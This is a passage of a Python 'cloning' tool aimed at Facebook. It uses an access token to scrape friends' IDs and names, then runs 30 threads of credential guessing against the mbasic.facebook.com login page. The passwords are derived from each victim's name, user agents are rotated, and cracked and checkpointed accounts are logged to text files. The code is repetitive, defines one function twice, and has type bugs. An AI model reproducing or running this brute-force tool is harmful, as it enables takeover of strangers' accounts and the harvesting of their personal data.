        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print (logo)
    print ("")
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("    cracking start please wait ..   ")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass1)
                ok=open('rsa-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass1)
                    cp=open('rsa-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass2)
                        ok=open('rsa-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass2)
                            cp=open('rsa-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"1234"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass3)
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass3)
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass4)
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass4)
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+"123"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass5)
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass5)
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] cloning complete result ........")
    print (39*'-')
    print ('[!] total ok ids : '+str(len(oks)))
    print ('[!] total cp ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press enter to back ')
    fb_menu()
    
def xokp():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print (logo)
    print ("")
    iiid=int(input("[1] Enter ID : "))
    print ("")
    ps1=int(input('[1] Password : '))
    ps2=int(input('[2] Password : '))
    ps3=int(input('[3] Password : '))
    ps4=int(input('[4] Password : '))
    print ("")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (g+"[=] Transfer Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print (logo)
    print ("")
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print ("[!] Total Ids: "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("    Cracking Start Please Wait ..   ")
    print ("    Use Airplane Mod For Up Speed ")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"1234"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+"123"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] Cloning Complete Result ........")
    print (39*'-')
    print ('[!] Total Ok Ids : '+str(len(oks)))
    print ('[!] Total Cp Ids :'+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press Enter To Back ')
    fb_menu()








def xokp():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print (logo)
    print ("")
    iiid=int(input("[=] Enter ID : "))
    print ("")
    ps1=int(input('[1] Password : '))
    ps2=int(input('[2] Password : '))
    ps3=int(input('[3] Password : '))
    ps4=int(input('[4] Password : '))
    print ("")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (g+"[=] Transfer Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
